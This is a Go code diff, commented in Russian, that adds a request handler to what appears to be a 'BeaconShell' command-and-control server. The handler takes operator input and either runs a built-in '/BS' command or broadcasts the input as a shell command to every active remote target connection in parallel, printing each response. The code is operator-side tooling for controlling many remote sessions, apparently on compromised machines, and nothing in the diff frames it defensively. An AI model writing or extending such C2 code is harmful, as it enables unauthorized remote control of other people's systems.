@@ -6,6 +6,7 @@ import (
 	"net"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -15,6 +16,44 @@ type Target struct {
 	conn   net.Conn
 	status bool
 	group  string
+}
+
+func processRequest(targets *[]Target, input string, mtx *sync.Mutex) {
+	// Обработка пустого ввода
+	if len(input) <= 1 {
+		return
+	}
+
+	// Удаление лишних символов
+	input = strings.TrimSpace(input)
+
+	// Разбиение команды на аргументы
+	splitted_input := strings.Fields(input)
+
+	// Проверка типа команды
+	if splitted_input[0] == "/BS" {
+		// Выполнение встроенной команды BeaconShell
+		BeaconShellRequest(splitted_input, targets, mtx)
+	} else {
+		// Создание канала для получения результатов команд
+		ch_resp := make(chan string)
+
+		// Выполнение команды для каждого активного хоста
+		for i := 0; i < len(*targets); i++ {
+			if (*targets)[i].status == true {
+				// Отправка команды на целевой хост
+				go sendCommand((*targets)[i], input, ch_resp)
+			}
+		}
+
+		// Получение ответов от каждого активного хоста
+		for i := 0; i < active_targets; i++ {
+			response := <-ch_resp
+			if len(response) > 0 {
+				fmt.Println(response)
+			}
+		}
+	}
 }
 
 func addSession(targets *[]Target, target_name string) {
